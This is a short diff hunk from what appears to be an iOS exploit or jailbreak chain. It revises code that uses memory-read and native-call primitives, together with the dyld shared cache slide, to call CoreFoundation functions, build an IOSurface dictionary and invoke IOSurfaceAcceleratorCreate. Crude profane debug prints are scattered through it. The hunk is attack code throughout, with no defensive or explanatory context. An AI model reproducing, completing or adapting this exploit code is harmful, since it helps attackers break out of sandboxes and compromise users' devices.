@@ -38,13 +38,13 @@ function memcpy_exec(dst, src, size) {
 	printf("fuck you test=%p %p %p\n", test, pitch, read_u32(dict));
 	scall("printf", "%x %x %x %x\n", read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide()), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 4), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 8), read_u32(CFDictionarySetValue_addr + get_dyld_shc_slide() + 12));
 	callnarg(CFShow_addr + get_dyld_shc_slide(), dict);
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), test);
+	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceBytesPerRow), read_u32(my_kIOSurfaceBytesPerRow + 4), read_u32(my_kIOSurfaceBytesPerRow + 8), read_u32(my_kIOSurfaceBytesPerRow + 12), test);
 	printf("fuck1\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
+	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceWidth), read_u32(my_kIOSurfaceWidth + 4), read_u32(my_kIOSurfaceWidth + 8), read_u32(my_kIOSurfaceWidth + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, width));
 	printf("fuck2\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceHeight), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
+	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfaceHeight), read_u32(my_kIOSurfaceHeight + 4), read_u32(my_kIOSurfaceHeight + 8), read_u32(my_kIOSurfaceHeight + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, height));
 	printf("fuck3\n");
-	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfacePixelFormat), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
+	callnarg(CFDictionarySetValue_addr + get_dyld_shc_slide(), dict, read_u32(my_kIOSurfacePixelFormat), read_u32(my_kIOSurfacePixelFormat + 4), read_u32(my_kIOSurfacePixelFormat + 8), read_u32(my_kIOSurfacePixelFormat + 12), callnarg(CFNumberCreate_addr + get_dyld_shc_slide(), 0, kCFNumberSInt32Type, pixel_format));
 	printf("fuck4\n");
 	printf("fuck you\n");
 	printf("%d\n", callnarg(my_IOSurfaceAcceleratorCreate, 0, 0, accel));
